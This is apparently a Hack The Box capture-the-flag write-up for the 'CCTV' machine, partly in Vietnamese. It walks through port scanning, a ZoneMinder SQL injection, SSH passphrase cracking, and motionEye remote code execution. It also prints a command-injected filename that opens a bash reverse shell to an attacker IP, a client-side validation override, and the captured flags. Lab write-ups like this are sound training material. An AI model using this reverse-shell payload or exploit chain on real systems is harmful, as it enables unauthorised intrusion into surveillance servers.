# HTB Write-up: CCTV

<p align="center">
  <b>Machine:</b> FACT &nbsp; | &nbsp;
  <b>Difficulty:</b> Easy &nbsp; | &nbsp;
  <b>OS:</b> Linux
</p>

---

## 📌 Table of Contents

1. [Reconnaissance](#-reconnaissance)
2. [Enumeration](#-enumeration)
3. [Exploitation](#-exploitation)
4. [Cloud Pivot](#-cloud-pivot)
5. [Initial Access](#-initial-access)
6. [Privilege Escalation](#-privilege-escalation)
7. [Flags](#-flags)

---

# 🔎 Reconnaissance

## 1. Nmap TCP Full Port Scan

```bash
nmap -p- --min-rate=1000 -T4 10.129.96.80 -oN 1-tcp-allports.txt
```

<p align="center">
  <img src="./screenshots/1.png" ">
</p>

<p align="center"><i>Figure 1: Full TCP port scan result</i></p>

---

## 2. Nmap UDP Full Port Scan

```bash
sudo nmap -sU -p- --min-rate=1000 10.129.96.80 -oN 3-udp-allports.txt
```

<p align="center">
  <img src="./screenshots/2.png" ">
</p>

<p align="center"><i>Figure 3: UDP scan result</i></p>

---

# 🧭 Enumeration

## 3. Directory Enumeration (Gobuster)

```bash
gobuster dir -u http://cctv.htb \
-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
-x php,txt,html -o 4-gobuster.txt
```

<p align="center">
  <img src="./screenshots/3.png" ">
</p>

<p align="center"><i>Figure 4: Directory brute-force result</i></p>

---

## 4. Admin Panel Discovery

- Truy cập: `http://cctv.htb/`
- Phát hiện login portal

<p align="center">
  <img src="./screenshots/4.png" ">
</p>

<p align="center"><i>Figure 5: Admin login page</i></p>

---

## 5. Register & Login

- Thử đăng nhập với thông tin mặc định: `admin/admin`
- Xác định version CMS

<p align="center">
  <img src="./screenshots/5.png" ">
</p>

<p align="center"><i>Figure 6: ZoneMinder dashboard</i></p>

---

# 💥 Exploitation

## 6. Exploit CVE based on CMS Version

- Tra cứu thông tin ZoneMinder 1.37.63 -> CVE-2024-51482
- Thực hiện khai thác lỗ hổng

<p align="center">
  <img src="./screenshots/6.png" ">
</p>

<p align="center"><i>Figure 7: Username - SQL Injection</i></p>

<p align="center">
  <img src="./screenshots/7.png" ">
</p>

<p align="center"><i>Figure 8: Password - SQL Injection</i></p>

# 🔐 Initial Access

## 7. Crack SSH Passphrase

```bash
john --wordlist=wordlist.txt hash.txt
john --show hash.txt
```

<p align="center">
  <img src="./screenshots/8.png" ">
</p>

<p align="center"><i>Figure 9: Cracking SSH hashcat</i></p>

## 8. SSH Access

```bash
ssh mark@10.129.96.80
# Password: opensesame
```

---

# 👑 Privilege Escalation

## 9. Root Access

[NOTE]
Theo thông tin `https://github.com/Gh0s7Ops/CVE-2024-51482-Multi-Stage-Surveillance-System-Exploit`, thực hiện kiểm tra version motionEye trên server - `0.43.1b4` - `CVE-2025-60787` cho phép thực hiện RCE.

<p align="center">
  <img src="./screenshots/10.png" ">
</p>

<p align="center"><i>Figure 10: motionEye user/pass</i></p>

- Tạo kết nối tunel đến motionEye
- Truy cập web và bỏ qua bước xác thực phía máy khách bằng cách ghi đè hàm JavaScript
- Tạo shell và kích hoạt shell

```bash
ssh -L 8765:127.0.0.1:8765 mark@10.129.96.80
configUiValid = function() { return true; };
$(python3 -c "import os;os.system('bash -c \"bash -i >& /dev/tcp/10.10.14.49/4444 0>&1\"')").%Y-%m-%d-%H-%M-%S
curl "http://127.0.0.1:7999/1/action/snapshot"
cat /home/sa_mark/user.txt
cat /root/root.txt
```

<p align="center">
  <img src="./screenshots/11.png" ">
</p>

<p align="center"><i>Figure 11: SSH Tunel</i></p>

<p align="center">
  <img src="./screenshots/13.png" ">
</p>

<p align="center"><i>Figure 12: Bypassed the client-side validation</i></p>

<p align="center">
  <img src="./screenshots/14.png" ">
</p>

<p align="center"><i>Figure 13: Insert reverse shell</i></p>

<p align="center">
  <img src="./screenshots/15.png" ">
</p>

<p align="center"><i>Figure 14: Trigger reverse shell</i></p>

<p align="center">
  <img src="./screenshots/16.png" ">
</p>

<p align="center"><i>Figure 15: User/Root Flag</i></p>
---

# 🏁 Flags

- **User Flag:** `6969d2169da3b47b4ba75ac8d9060684`
- **Root Flag:** `329b29fe9334122749d8311d21aeea17`
